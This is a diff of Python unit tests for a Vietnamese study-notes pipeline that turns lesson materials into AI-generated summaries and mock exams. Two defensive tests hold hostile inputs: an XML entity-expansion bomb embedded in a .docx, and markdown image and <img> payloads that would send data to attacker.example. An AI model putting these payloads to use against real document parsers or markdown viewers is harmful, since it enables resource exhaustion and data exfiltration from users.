@@ -27,8 +27,8 @@ def item(name, relevance='cot_loi', difficulty='co_ban'):
 
 def fake_generate(calls):
     """Deterministic stand-in for the AI that answers each schema with valid synthetic data."""
-    def generate(system, parts, schema, effort='medium', config=None):
-        calls.append({'schema': schema, 'parts': parts, 'effort': effort})
+    def generate(system, parts, schema, effort='medium', config=None, images_required=False):
+        calls.append({'schema': schema, 'parts': parts, 'effort': effort, 'images_required': images_required})
         if schema is study.SESSION_SCHEMA:
             return {'tieu_de': 'Buổi', 'tom_tat': 'Tóm tắt', 'thuat_ngu': [{'thuat_ngu': 'Cung', 'giai_thich': 'Lượng bán'}],
                     'nhom': [{'ten': 'Cung cầu', 'mo_ta': '', 'muc': [item('Phụ', 'tham_khao', 'nang_cao'), item('Cầu', 'cot_loi', 'trung_binh'), item('Cung', 'cot_loi', 'co_ban')]}],
@@ -42,9 +42,11 @@ def fake_generate(calls):
                     'trong_tam_thi': ['Cân bằng'], 'ke_hoach_on': [{'buoc': 'Ngày 1', 'noi_dung': 'Đọc'}]}
         if schema is study.EXAM_SCHEMA:
             return {'tieu_de': 'Đề', 'thoi_gian_phut': 45,
-                    'trac_nghiem': [{'cau': 'Cung là?', 'lua_chon': ['a', 'b', 'c', 'd'], 'dap_an': 'B', 'giai_thich': 'Vì', 'do_kho': 'co_ban', 'chu_de': 'Cung cầu'},
-                                    {'cau': 'Thiếu lựa chọn', 'lua_chon': ['a', 'b'], 'dap_an': 'A', 'giai_thich': '', 'do_kho': 'co_ban', 'chu_de': 'x'}],
-                    'tu_luan': [{'cau': 'Phân tích', 'diem': 3, 'do_kho': 'nang_cao', 'chu_de': 'Cung cầu', 'goi_y_cham': ['Ý 1']}]}
+                    'trac_nghiem': [{'noi_dung_cau_hoi': 'Cung là?', 'lua_chon': ['a', 'b', 'c', 'd'], 'dap_an': 'B', 'giai_thich': 'Vì', 'do_kho': 'co_ban', 'chu_de': 'Cung cầu'},
+                                    {'noi_dung_cau_hoi': 'Thiếu lựa chọn', 'lua_chon': ['a', 'b'], 'dap_an': 'A', 'giai_thich': '', 'do_kho': 'co_ban', 'chu_de': 'x'},
+                                    {'noi_dung_cau_hoi': '3', 'lua_chon': ['a', 'b', 'c', 'd'], 'dap_an': 'A', 'giai_thich': '', 'do_kho': 'co_ban', 'chu_de': 'x'}],
+                    'tu_luan': [{'noi_dung_cau_hoi': 'Phân tích', 'diem': 3, 'do_kho': 'nang_cao', 'chu_de': 'Cung cầu', 'goi_y_cham': ['Ý 1']},
+                                {'noi_dung_cau_hoi': '2.', 'diem': 2, 'do_kho': 'co_ban', 'chu_de': 'x', 'goi_y_cham': []}]}
         raise AssertionError('unexpected schema')
     return generate
 
@@ -91,6 +93,23 @@ class DocumentTests(unittest.TestCase):
         broken = self.root / 'broken.docx'
         broken.write_bytes(b'not a zip')
         self.assertEqual(documents.parts_for(broken, 'claude')[0], [])
+
+    def test_hostile_office_files_stay_small_and_become_warnings(self):
+        bomb = office(self.root / 'bomb.docx', {'word/document.xml': '<!DOCTYPE d [<!ENTITY a "' + 'x' * 60 + '">]>'
+                                                f'<w:document {W}><w:body><w:p><w:r><w:t>' + '&a;' * 1000 + '</w:t></w:r></w:p></w:body></w:document>'})
+        parts, warning = documents.parts_for(bomb, 'claude')
+        self.assertEqual(parts, [])
+        self.assertIn('không đọc được', warning)
+        with patch.object(documents, 'TEXT_LIMIT', 50):
+            long = office(self.root / 'long.docx', {'word/document.xml': f'<w:document {W}><w:body>' + ('<w:p><w:r><w:t>' + 'y' * 30 + '</w:t></w:r></w:p>') * 10 + '</w:body></w:document>'})
+            self.assertEqual(documents.text_of(long), 'y' * 30 + '\n' + 'y' * 20)
+        slide = f'<p:sld xmlns:p="x" {A}><a:p><a:r><a:t>' + 'z' * 100 + '</a:t></a:r></a:p></p:sld>'
+        with patch.object(documents, 'OFFICE_LIMIT', 1000):
+            many = office(self.root / 'many.pptx', {'ppt/slides/slide' + str(n) + '.xml': slide for n in range(1, 30)})
+            self.assertEqual(documents.parts_for(many, 'ollama')[0], [])
+        # Files that are broken in other ways (missing part, unsupported compression) are warnings too.
+        empty = office(self.root / 'empty.docx', {'other.xml': '<x/>'})
+        self.assertIn('không đọc được', documents.parts_for(empty, 'claude')[1])
 
     def test_pdf_goes_whole_to_claude_and_as_text_to_ollama(self):
         from pypdf import PdfWriter
@@ -148,13 +167,20 @@ class StudyPipelineTests(unittest.TestCase):
         self.assertTrue((subject / '00_Tong_hop_mon/he_thong_kien_thuc.md').is_file())
         study.make_outline(subject)
         exam = study.make_exam(subject, multiple_choice=2, essays=1)
-        self.assertEqual(len(exam['trac_nghiem']), 1)
+        # Questions that are only a number, or lack four options, are dropped; stored questions keep the 'cau' field.
+        self.assertEqual([q['cau'] for q in exam['trac_nghiem'] + exam['tu_luan']], ['Cung là?', 'Phân tích'])
+        # One question short: the AI is asked once more for the rest, without repeating what it already wrote.
+        exam_calls = [c for c in self.calls if c['schema'] is study.EXAM_SCHEMA]
+        self.assertEqual(len(exam_calls), 2)
+        self.assertIn('Không lặp lại các câu đã có', exam_calls[1]['parts'][-1]['text'])
         self.assertEqual(study.exam(subject, exam['_meta']['id'])['tieu_de'], 'Đề')
         markdown = (subject / '00_Tong_hop_mon/de_thi_thu' / (exam['_meta']['id'] + '.md')).read_text(encoding='utf-8')
         self.assertIn('Đáp án', markdown)
         index = (self.root / '00_Tong_hop/Muc_luc.md').read_text(encoding='utf-8')
         self.assertIn('Kinh tế vi mô', index)
         self.assertIn('đã hệ thống hoá 1', index)
+        # Links survive the spaces and Vietnamese in folder names.
+        self.assertIn('](../Kinh%20t%E1%BA%BF%20vi%20m%C3%B4/00_Tong_hop_mon/he_thong_kien_thuc.md)', index)
         # New material makes the lesson, then the subject map and outline, out of date.
         (folder / study.MATERIALS).mkdir(parents=True)
         (folder / study.MATERIALS / 'them.txt').write_text('Độ co giãn', encoding='utf-8')
@@ -194,6 +220,112 @@ class StudyPipelineTests(unittest.TestCase):
         engine.request('subject', 'Kinh tế vi mô')
         self.assertEqual(len(engine.jobs), 1)
 
+    def test_unexpected_errors_are_remembered_instead_of_retried_every_scan(self):
+        self.lesson()
+        failing = []
+        def broken(*args, **kwargs):
+            failing.append(1)
+            raise MemoryError()
+        engine = study.Engine()
+        with patch.object(study.ai, 'generate', broken):
+            for _ in range(3):
+                engine.scan()
+                engine.run_jobs()
+        self.assertEqual(len(failing), 1)
+        self.assertIn('MemoryError', engine.status()['errors']['Kinh tế vi mô'])
+
+    def test_no_notes_are_made_while_the_lesson_is_still_recording(self):
+        folder = self.lesson(transcript='')
+        (folder / '01_Tai_lieu_goc/slide_0001.jpg').write_bytes(b'jpg')
+        engine = study.Engine()
+        with patch.object(study.runner, 'state', lambda: {'running': True, 'path': str(folder)}):
+            engine.scan()
+            self.assertEqual(list(engine.jobs), [])
+        engine.scan()
+        self.assertEqual(list(engine.jobs), [('session', folder, ())])
+
+    def test_model_text_cannot_plant_images_or_html_in_markdown(self):
+        folder = self.lesson()
+        notes = study.analyze_session(folder.parent, folder)
+        notes['tom_tat'] = '![x](https://attacker.example/p?d=bai) <img src="https://attacker.example/i"> [nguồn](https://example.org)'
+        markdown = study.session_markdown('Môn', notes)
+        self.assertNotIn('![', markdown)
+        # Escaped, so viewers show the text instead of loading it; ordinary links stay clickable.
+        self.assertIn('\\<img', markdown)
+        self.assertNotIn(' <img', markdown)
+        self.assertIn('[nguồn](https://example.org)', markdown)
+
+    def test_a_finished_transcription_of_silence_is_not_repeated(self):
+        folder = self.lesson(transcript='')
+        (folder / '01_Tai_lieu_goc/am_thanh.wav').write_bytes(b'RIFF')
+        (folder / '02_Tom_tat/ban_chep_loi.txt').write_text('', encoding='utf-8')
+        self.assertEqual(study.transcription_state(folder), 'needed')
+        (folder / '02_Tom_tat/trang_thai.json').write_text(json.dumps({'state': 'completed', 'segments': 0}), encoding='utf-8')
+        self.assertEqual(study.transcription_state(folder), 'done')
+        later = time.time() + 5
+        os.utime(folder / '01_Tai_lieu_goc/am_thanh.wav', (later, later))
+        self.assertEqual(study.transcription_state(folder), 'needed')
+
+    def test_a_killed_transcriber_is_recorded_as_failed(self):
+        folder = self.lesson(transcript='')
+        (folder / '01_Tai_lieu_goc/am_thanh.wav').write_bytes(b'RIFF')
+        status = folder / '02_Tom_tat/trang_thai.json'
+        status.write_text(json.dumps({'state': 'processing', 'time': '2026-10-01T08:00:00'}), encoding='utf-8')
+        class Killed:
+            def wait(self):
+                return -9
+        study.runner.watch_transcription(Killed(), status)
+        self.assertEqual(json.loads(status.read_text(encoding='utf-8'))['state'], 'failed')
+        self.assertEqual(study.transcription_state(folder), 'failed')
+
+    def test_exam_stems_that_only_name_a_topic_become_questions(self):
+        options = ['a', 'b', 'c', 'd']
+        choice, written = study._exam_questions({'trac_nghiem': [{'noi_dung_cau_hoi': 'Cân bằng thị trường', 'lua_chon': options},
+                                                                 {'noi_dung_cau_hoi': 'GDP danh nghĩa', 'lua_chon': options},
+                                                                 {'noi_dung_cau_hoi': 'Khi giá tăng thì lượng cầu thay đổi thế nào?', 'lua_chon': options}],
+                                                 'tu_luan': [{'noi_dung_cau_hoi': '1'}]})
+        self.assertEqual([q['cau'] for q in choice], ['Phát biểu nào sau đây đúng về cân bằng thị trường?',
+                                                      'Phát biểu nào sau đây đúng về GDP danh nghĩa?',
+                                                      'Khi giá tăng thì lượng cầu thay đổi thế nào?'])
+        self.assertEqual(written, [])
+
+    def test_a_broken_lesson_does_not_hold_back_the_subject(self):
+        good = self.lesson()
+        broken = self.lesson(title='File hỏng', transcript='')
+        (broken / study.MATERIALS).mkdir(parents=True)
+        (broken / study.MATERIALS / 'hong.docx').write_bytes(b'not a zip')
+        engine = study.Engine()
+        for _ in range(4):
+            engine.scan()
+            engine.run_jobs()
+        overview = study.overview(engine)['subjects'][0]
+        self.assertEqual((overview['ready'], overview['stale']), (1, 1))
+        self.assertIn('File hỏng', overview['error'])
+        self.assertTrue(overview['map_current'] and overview['outline_current'])
+        self.assertEqual(study.knowledge_map(good.parent)['_meta']['sessions'], [study.sessions(good.parent)[0]['label']])
+        # The failing lesson stays visible after the subject updates, and is not retried on every scan.
+        self.assertIn('hong.docx', overview['error'])
+        # Making an exam does not retry the broken lesson.
+        calls = len(self.calls)
+        engine.request('exam', 'Kinh tế vi mô', multiple_choice=2, essays=1, mix='can_bang')
+        engine.scan()
+        self.assertEqual(engine.jobs[0][0], 'exam')
+        self.assertEqual(len(engine.jobs), 1)
+        engine.run_jobs()
+        self.assertEqual({id(c['schema']) for c in self.calls[calls:]}, {id(study.EXAM_SCHEMA)})
+        # A manual sync retries it once, still builds the subject map from the good lesson, and keeps the error.
+        engine.request('subject', 'Kinh tế vi mô')
+        engine.run_jobs()
+        self.assertIn('hong.docx', study.overview(engine)['subjects'][0]['error'])
+        # Fixing the file clears the error.
+        (broken / study.MATERIALS / 'hong.docx').unlink()
+        (broken / study.MATERIALS / 'sua.txt').write_text('Độ co giãn', encoding='utf-8')
+        for _ in range(4):
+            engine.scan()
+            engine.run_jobs()
+        overview = study.overview(engine)['subjects'][0]
+        self.assertEqual((overview['ready'], overview['error']), (2, ''))
+
     def test_long_input_is_split_and_attachments_ride_with_the_first_part(self):
         folder = self.lesson(transcript='\n'.join('[00:%02d] câu %d' % (i % 60, i) for i in range(400)))
         (folder / '01_Tai_lieu_goc/slide_0001.jpg').write_bytes(b'jpg')
@@ -203,6 +335,21 @@ class StudyPipelineTests(unittest.TestCase):
         self.assertGreater(len(session_calls), 2)
         with_images = [i for i, c in enumerate(session_calls) if any(p['kind'] == 'image' for p in c['parts'])]
         self.assertEqual(with_images, [0])
+
+    def test_unreadable_or_image_only_inputs_never_let_the_ai_guess(self):
+        folder = self.lesson(transcript='')
+        (folder / study.MATERIALS).mkdir(parents=True)
+        (folder / study.MATERIALS / 'hong.docx').write_bytes(b'not a zip')
+        with self.assertRaises(study.ai.AIError) as result:
+            study.analyze_session(folder.parent, folder)
+        self.assertIn('hong.docx', str(result.exception))
+        self.assertEqual(self.calls, [])
+        (folder / study.MATERIALS / 'vo_ghi.png').write_bytes(b'png')
+        study.analyze_session(folder.parent, folder)
+        self.assertTrue(self.calls[-1]['images_required'])
+        (folder / study.MATERIALS / 'de_cuong.txt').write_text('Cung và cầu', encoding='utf-8')
+        study.analyze_session(folder.parent, folder)
+        self.assertFalse(self.calls[-1]['images_required'])
 
     def test_audio_waits_for_transcription_only_when_the_model_exists(self):
         folder = self.lesson(transcript='')
